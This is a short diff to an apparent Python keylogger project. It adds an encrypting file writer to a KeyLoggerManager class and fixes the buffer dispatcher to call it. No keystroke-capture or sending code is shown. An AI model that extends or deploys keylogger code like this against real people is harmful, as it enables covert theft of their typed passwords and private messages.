@@ -5,9 +5,11 @@ import time
 
 
 
+
 class KeyLoggerManager:
     def __init__(self,timer = 60):
         self.key_logger_service = KeyLoggerService()
+        self.FileWriter = EncrypterFileWriter()
         self.timer = timer
         self.buffer = []
         self.collect = True
@@ -27,7 +29,7 @@ class KeyLoggerManager:
 
     def data_dispatcher(self):
         if self.buffer:
-            self.EncrypterFileWriter.data_receiver()
+            self.FileWriter.data_receiver()
             self.buffer.clear()
 
 
